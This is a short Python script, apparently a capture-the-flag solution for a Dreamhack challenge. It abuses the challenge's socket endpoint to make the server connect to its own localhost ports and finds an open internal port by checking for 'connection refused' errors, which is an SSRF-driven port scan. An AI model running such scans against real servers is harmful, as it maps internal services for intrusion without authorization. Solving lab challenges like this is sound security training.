import requests
from tqdm import tqdm


def check_response(port):
    global chall_url

    data = {
        'host': '127.0.0.1',
        'port': port,
        'data': '1234'
    }
    response = requests.post(chall_url, data=data)
    return response.text


def find_port():
    for port in tqdm(range(1801, 9999)):
        response_txt = check_response(port)
        if 'Errno 111' not in response_txt:
            print(f'Found Port number {port}')
            break


if __name__ == "__main__":
    chall_url = f"http://host3.dreamhack.games:15312/socket"
    find_port()
